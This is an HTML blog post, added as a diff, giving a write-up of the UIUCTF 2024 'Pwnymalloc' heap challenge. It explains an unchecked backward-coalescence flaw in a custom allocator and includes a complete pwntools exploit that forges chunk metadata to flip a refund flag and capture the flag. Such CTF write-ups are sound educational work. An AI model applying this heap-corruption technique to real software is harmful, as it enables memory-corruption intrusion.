@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>UIUCTF24 - Pwnymalloc | leo_something</title>
+<meta name="keywords" content="pwn, heap, custom allocator">
+<meta name="description" content="Pwnymalloc is a nice custom allocator challenge from UIUCTF 2024. The vulnerability was about an incorrect handling of the prev_size during consolitation.">
+<meta name="author" content="leo_something">
+<link rel="canonical" href="http://leo1.cc:5555/posts/writeups/uiuctf24-pwnymalloc/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.0c2131417d0b88f5928cdb2549da0d09bb391dae4fb3114012aa1349b07d4a44.css" integrity="sha256-DCExQX0LiPWSjNslSdoNCbs5Ha5PsxFAEqoTSbB9SkQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://leo1.cc:5555/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://leo1.cc:5555/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://leo1.cc:5555/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://leo1.cc:5555/apple-touch-icon.png">
+<link rel="mask-icon" href="http://leo1.cc:5555/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://leo1.cc:5555/posts/writeups/uiuctf24-pwnymalloc/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="http://leo1.cc:5555/posts/writeups/uiuctf24-pwnymalloc/">
+  <meta property="og:site_name" content="leo_something">
+  <meta property="og:title" content="UIUCTF24 - Pwnymalloc">
+  <meta property="og:description" content="Pwnymalloc is a nice custom allocator challenge from UIUCTF 2024. The vulnerability was about an incorrect handling of the prev_size during consolitation.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-07-08T12:00:00+00:00">
+    <meta property="article:modified_time" content="2024-07-08T12:00:00+00:00">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="Heap">
+    <meta property="article:tag" content="Custom Allocator">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="UIUCTF24 - Pwnymalloc">
+<meta name="twitter:description" content="Pwnymalloc is a nice custom allocator challenge from UIUCTF 2024. The vulnerability was about an incorrect handling of the prev_size during consolitation.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://leo1.cc:5555/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "UIUCTF24 - Pwnymalloc",
+      "item": "http://leo1.cc:5555/posts/writeups/uiuctf24-pwnymalloc/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "UIUCTF24 - Pwnymalloc",
+  "name": "UIUCTF24 - Pwnymalloc",
+  "description": "Pwnymalloc is a nice custom allocator challenge from UIUCTF 2024. The vulnerability was about an incorrect handling of the prev_size during consolitation.",
+  "keywords": [
+    "pwn", "heap", "custom allocator"
+  ],
+  "articleBody": "BINARY OVERVIEW Pwnymalloc is a custom heap implementation library, the mechanics resemble the actual heap behaviors, but the code is really simple and short, so it must be pwnable!\nWe are also provided with a binary that implements a “customer service portal” using Pwnymalloc library.\nBINARY REVERSE ENGINEERING The binary allows a user to:\nSubmit a complaint: allocate a chunk, write into it and free it (basically throws our opinion away, thank you!) Request a refund: allocate a chunk and write into it (this chunk has a REFUND_APPROVED bit set to 0, and we cannot change it) Check refund status: prints the flag if a refund gets somehow approved (REFUND_APPROVED == 1) Our goal should be to break Pwnymalloc to somehow override the REFUND_APPROVED bit and get the flag, so let’s read the library’s source code.\nLIBRARY REVERSE ENGINEERING My first hope was to be able to find the vulnerability without having to reverse all the code, which was not so short after all. But, guess what… I ended up reading and trying to understand the whole code :/\nThis took quite a bit of time, but being familiar with the glibc heap implementation it’s easy to guess what these functions are doing.\nReading through the code we can identify the 2 most important functions:\npwnymalloc(size):\nInitializes the heap if it’s the first allocation. Aligns the requested size and searches for a fitting block. If no suitable block is found, it extends the heap. Optionally splits larger blocks to minimize waste. Returns a pointer to the allocated memory. pwnyfree(ptr):\nValidates the pointer and its alignment. Marks the block as free and attempts to coalesce it with adjacent free blocks. Inserts the coalesced block back into the free list. A thing that caught my attention here was the “coalescence” feature: it sounded sketchy (and that turned out to be a really lucky guess).\nstatic chunk_ptr coalesce(chunk_ptr block) { chunk_ptr prev_block = prev_chunk(block); chunk_ptr next_block = next_chunk(block); size_t size = get_size(block); int prev_status = prev_block == NULL ? -1 : get_status(prev_block); int next_status = next_block == NULL ? -1 : get_status(next_block); if (prev_status == FREE \u0026\u0026 next_status == FREE) { // ... } The functions starts by getting the pointers to the previous and next chunk, but how is it done?\nstatic chunk_ptr prev_chunk(chunk_ptr block) { if ((void *) block - get_prev_size(block) \u003c heap_start || get_prev_size(block) == 0) { return NULL; } return (chunk_ptr) ((char *) block - get_prev_size(block)); } static size_t get_prev_size(chunk_ptr block) { btag_t *prev_footer = (btag_t *) ((char *) block - BTAG_SIZE); return prev_footer-\u003esize; } Okay, so the btag is the size of a free chunk and it is located in the last WORD of it. Apparently this is used to calculate the pointer to the previous chunk during backward consolidation coalescence, but wait a moment, there is no check to confirm that the previous chunk is free!\nWe could basically allocate a chunk and write a fake btag in its last WORD, in this way if coalesce is triggered on the chunk after it prev_chunk would calcolate and return an arbitrary pointer!\nEXPLOITATION At this point the exploitation path was really clear to me:\nAllocate a chunk containing a fake chunk (it’s pointer will be calculated by prev_chunk using a fake btag). Allocate another chunk and place a forged btag in its last WORD, calculating the right offset from the fake chunk. Allocate a chunk and free it to trigger the coalesce mechanism and get the fake chunk into the “bin”. Finally allocate the fake chunk and override the REFUND_APPROVED bit and get the flag! Problems I faced Obviously the exploit didn’t work first try, the main problems I faced are the following:\nthe fake chunk must be aligned at 16 bytes, the fake chunk’s fd and bk (pointers to next and previous free chunks) must be set to 0 to avoid further pain, the fake chunk must be set to FREE so the metadata must be calculated with the following formula: size | status. Final Exploit #!/usr/bin/env python3 from pwn import * exe = ELF(\"./chal\") context.binary = exe context.terminal = [\"alacritty\", \"-e\"] def conn(): if args.GDB: r = gdb.debug([exe.path], gdbscript=\"b *pwnymalloc+210\") elif args.REMOTE: r = remote(\"pwnymalloc.chal.uiuc.tf\", 1337, ssl=True) else: r = process([exe.path]) return r r = conn() def refund(amount, payload): r.sendlineafter(b\"\u003e\", b\"3\") r.sendlineafter(b\":\", str(amount).encode()) r.sendafter(b\":\", payload) def complaint(text): r.sendlineafter(b\"\u003e\", b\"1\") r.sendlineafter(b\":\", text.encode()) def main(): progress = log.progress(\"cooking\") # build fake chunk fake_chunk_metadata = flat(0, 0xa0) payload = b\"a\"*0x28 + fake_chunk_metadata + b\"\\x00\"*71 refund(12, payload) # allocate a chunk with a forged btag btag = 0xe0 payload = b\"\\x00\"*0x78 + p32(btag) + b\"\\x00\"*3 refund(12, payload) # allocate and free complaint(\"hello\") # override REFUND_APPROVED bit of complaint REFUND_APPROVED = 1 payload = b\"a\"*0x40 + p64(0x91) + p32(REFUND_APPROVED) + p32(12) + b\"\\x00\"*0x2f refund(12, payload) # check status to get the flag! r.sendlineafter(b\"\u003e\", b\"4\") r.sendlineafter(b\":\", b\"1\") progress.success() r.interactive() if __name__ == \"__main__\": main() FLAG: uiuctf{the_memory_train_went_off_the_tracks}\nPost Scriptum I realized that if the first thing you do after running the binary is submitting a complaint the program would SIGSEGV. That’s because pwnyfree always calls coalesce and in turn coalesce tries to get the previous chunk’s btag. The thing is that the complaint is the first heap allocation, there is no previous chunk, so the program tries to get the contents of the WORD right before the start of the heap (which is not in mapped memory).\nI learned a really good lesson here: always try the binary before reading the code!\n",
+  "wordCount" : "909",
+  "inLanguage": "en",
+  "datePublished": "2024-07-08T12:00:00Z",
+  "dateModified": "2024-07-08T12:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "leo_something"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://leo1.cc:5555/posts/writeups/uiuctf24-pwnymalloc/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "leo_something",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://leo1.cc:5555/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://leo1.cc:5555/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://leo1.cc:5555/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://leo1.cc:5555/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://leo1.cc:5555/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      UIUCTF24 - Pwnymalloc
+    </h1>
+    <div class="post-meta"><span title='2024-07-08 12:00:00 +0000 UTC'>July 8, 2024</span>&nbsp;·&nbsp;leo_something
+
+</div>
+  </header>
+  <div class="tags" style="padding: 2px;">
+    <div style="display: flex; flex-wrap: wrap; gap: 5px;">
+      
+      <a href="/tags/pwn" class="custom-tag">
+        pwn
+      </a>
+      
+      <a href="/tags/heap" class="custom-tag">
+        heap
+      </a>
+      
+      <a href="/tags/custom-allocator" class="custom-tag">
+        custom allocator
+      </a>
+      
+    </div>
+  </div>
+
+  <div style="height: var(--gap);"></div> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#binary-overview" aria-label="BINARY OVERVIEW">BINARY OVERVIEW</a></li>
+                <li>
+                    <a href="#binary-reverse-engineering" aria-label="BINARY REVERSE ENGINEERING">BINARY REVERSE ENGINEERING</a></li>
+                <li>
+                    <a href="#library-reverse-engineering" aria-label="LIBRARY REVERSE ENGINEERING">LIBRARY REVERSE ENGINEERING</a></li>
+                <li>
+                    <a href="#exploitation" aria-label="EXPLOITATION">EXPLOITATION</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#problems-i-faced" aria-label="Problems I faced">Problems I faced</a></li>
+                <li>
+                    <a href="#final-exploit" aria-label="Final Exploit">Final Exploit</a></li>
+                <li>
+                    <a href="#post-scriptum" aria-label="Post Scriptum">Post Scriptum</a>
+                </li>
+            </ul>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="binary-overview">BINARY OVERVIEW<a hidden class="anchor" aria-hidden="true" href="#binary-overview">#</a></h2>
+<p>Pwnymalloc is a custom heap implementation library, the mechanics resemble the actual heap behaviors, but the code is really simple and short, so it must be pwnable!</p>
+<p>We are also provided with a binary that implements a &ldquo;customer service portal&rdquo; using Pwnymalloc library.</p>
+<hr>
+<h2 id="binary-reverse-engineering">BINARY REVERSE ENGINEERING<a hidden class="anchor" aria-hidden="true" href="#binary-reverse-engineering">#</a></h2>
+<p>The binary allows a user to:</p>
+<ul>
+<li>Submit a complaint: allocate a chunk, write into it and free it (basically throws our opinion away, thank you!)</li>
+<li>Request a refund: allocate a chunk and write into it (this chunk has a REFUND_APPROVED bit set to 0, and we cannot change it)</li>
+<li>Check refund status: prints the flag if a refund gets somehow approved (REFUND_APPROVED == 1)</li>
+</ul>
+<p>Our goal should be to break Pwnymalloc to somehow override the REFUND_APPROVED bit and get the flag, so let&rsquo;s read the library&rsquo;s source code.</p>
+<hr>
+<h2 id="library-reverse-engineering">LIBRARY REVERSE ENGINEERING<a hidden class="anchor" aria-hidden="true" href="#library-reverse-engineering">#</a></h2>
+<p>My first hope was to be able to find the vulnerability without having to reverse all the code, which was not so short after all. But, guess what&hellip; I ended up reading and trying to understand the whole code :/</p>
+<p>This took quite a bit of time, but being familiar with the glibc heap implementation it&rsquo;s easy to guess what these functions are doing.</p>
+<p>Reading through the code we can identify the 2 most important functions:</p>
+<ol>
+<li>
+<p><strong><code>pwnymalloc(size)</code></strong>:</p>
+<ul>
+<li>Initializes the heap if it’s the first allocation.</li>
+<li>Aligns the requested size and searches for a fitting block.</li>
+<li>If no suitable block is found, it extends the heap.</li>
+<li>Optionally splits larger blocks to minimize waste.</li>
+<li>Returns a pointer to the allocated memory.</li>
+</ul>
+</li>
+<li>
+<p><strong><code>pwnyfree(ptr)</code></strong>:</p>
+<ul>
+<li>Validates the pointer and its alignment.</li>
+<li>Marks the block as free and attempts to coalesce it with adjacent free blocks.</li>
+<li>Inserts the coalesced block back into the free list.</li>
+</ul>
+</li>
+</ol>
+<p>A thing that caught my attention here was the &ldquo;coalescence&rdquo; feature: it sounded sketchy (and that turned out to be a really lucky guess).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> chunk_ptr <span style="color:#a6e22e">coalesce</span>(chunk_ptr block) { 
+</span></span><span style="display:flex;"><span>	chunk_ptr prev_block <span style="color:#f92672">=</span> <span style="color:#a6e22e">prev_chunk</span>(block); 
+</span></span><span style="display:flex;"><span>	chunk_ptr next_block <span style="color:#f92672">=</span> <span style="color:#a6e22e">next_chunk</span>(block); 
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">size_t</span> size <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_size</span>(block); 
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> prev_status <span style="color:#f92672">=</span> prev_block <span style="color:#f92672">==</span> NULL <span style="color:#f92672">?</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">get_status</span>(prev_block); 
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> next_status <span style="color:#f92672">=</span> next_block <span style="color:#f92672">==</span> NULL <span style="color:#f92672">?</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">get_status</span>(next_block); 
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (prev_status <span style="color:#f92672">==</span> FREE <span style="color:#f92672">&amp;&amp;</span> next_status <span style="color:#f92672">==</span> FREE) {
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><p>The functions starts by getting the pointers to the previous and next chunk, but how is it done?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> chunk_ptr <span style="color:#a6e22e">prev_chunk</span>(chunk_ptr block) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) block <span style="color:#f92672">-</span> <span style="color:#a6e22e">get_prev_size</span>(block) <span style="color:#f92672">&lt;</span> heap_start <span style="color:#f92672">||</span> 
+</span></span><span style="display:flex;"><span>	    <span style="color:#a6e22e">get_prev_size</span>(block) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (chunk_ptr) ((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) block <span style="color:#f92672">-</span> <span style="color:#a6e22e">get_prev_size</span>(block));
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">size_t</span> <span style="color:#a6e22e">get_prev_size</span>(chunk_ptr block) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">btag_t</span> <span style="color:#f92672">*</span>prev_footer <span style="color:#f92672">=</span> (<span style="color:#66d9ef">btag_t</span> <span style="color:#f92672">*</span>) ((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) block <span style="color:#f92672">-</span> BTAG_SIZE);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> prev_footer<span style="color:#f92672">-&gt;</span>size;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Okay, so the <code>btag</code> is the size of a free chunk and it is located in the last WORD of it. Apparently this is used to calculate the pointer to the previous chunk during backward <del>consolidation</del> coalescence, but wait a moment, there is no check to confirm that the previous chunk is free!</p>
+<p>We could basically allocate a chunk and write a fake <code>btag</code> in its last WORD, in this way if <code>coalesce</code> is triggered on the chunk after it <code>prev_chunk</code> would calcolate and return an arbitrary pointer!</p>
+<hr>
+<h2 id="exploitation">EXPLOITATION<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h2>
+<p>At this point the exploitation path was really clear to me:</p>
+<ol>
+<li>Allocate a chunk containing a fake chunk (it&rsquo;s pointer will be calculated by <code>prev_chunk</code> using a fake <code>btag</code>).</li>
+<li>Allocate another chunk and place a forged <code>btag</code> in its last WORD, calculating the right offset from the fake chunk.</li>
+<li>Allocate a chunk and free it to trigger the <code>coalesce</code> mechanism and get the fake chunk into the &ldquo;bin&rdquo;.</li>
+<li>Finally allocate the fake chunk and override the REFUND_APPROVED bit and get the flag!</li>
+</ol>
+<h4 id="problems-i-faced">Problems I faced<a hidden class="anchor" aria-hidden="true" href="#problems-i-faced">#</a></h4>
+<p>Obviously the exploit didn&rsquo;t work first try, the main problems I faced are the following:</p>
+<ul>
+<li>the fake chunk must be aligned at 16 bytes,</li>
+<li>the fake chunk&rsquo;s <code>fd</code> and <code>bk</code> (pointers to next and previous free chunks) must be set to 0 to avoid further pain,</li>
+<li>the fake chunk must be set to FREE so the metadata must be calculated with the following formula: <code>size | status</code>.</li>
+</ul>
+<h4 id="final-exploit">Final Exploit<a hidden class="anchor" aria-hidden="true" href="#final-exploit">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./chal&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;alacritty&#34;</span>, <span style="color:#e6db74">&#34;-e&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>debug([exe<span style="color:#f92672">.</span>path], gdbscript<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;b *pwnymalloc+210&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>REMOTE:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;pwnymalloc.chal.uiuc.tf&#34;</span>, <span style="color:#ae81ff">1337</span>, ssl<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> conn()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">refund</span>(amount, payload):
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>, str(amount)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">complaint</span>(text): 
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>, text<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    progress <span style="color:#f92672">=</span> log<span style="color:#f92672">.</span>progress(<span style="color:#e6db74">&#34;cooking&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># build fake chunk</span>
+</span></span><span style="display:flex;"><span>    fake_chunk_metadata <span style="color:#f92672">=</span> flat(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0xa0</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x28</span> <span style="color:#f92672">+</span> fake_chunk_metadata <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">71</span>
+</span></span><span style="display:flex;"><span>    refund(<span style="color:#ae81ff">12</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># allocate a chunk with a forged btag</span>
+</span></span><span style="display:flex;"><span>    btag <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xe0</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x78</span> <span style="color:#f92672">+</span> p32(btag) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>    refund(<span style="color:#ae81ff">12</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># allocate and free</span>
+</span></span><span style="display:flex;"><span>    complaint(<span style="color:#e6db74">&#34;hello&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># override REFUND_APPROVED bit of complaint</span>
+</span></span><span style="display:flex;"><span>    REFUND_APPROVED <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x40</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x91</span>) <span style="color:#f92672">+</span> p32(REFUND_APPROVED) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">12</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x2f</span>
+</span></span><span style="display:flex;"><span>    refund(<span style="color:#ae81ff">12</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># check status to get the flag!</span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    progress<span style="color:#f92672">.</span>success()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p><strong>FLAG</strong>: uiuctf{the_memory_train_went_off_the_tracks}</p>
+<h4 id="post-scriptum">Post Scriptum<a hidden class="anchor" aria-hidden="true" href="#post-scriptum">#</a></h4>
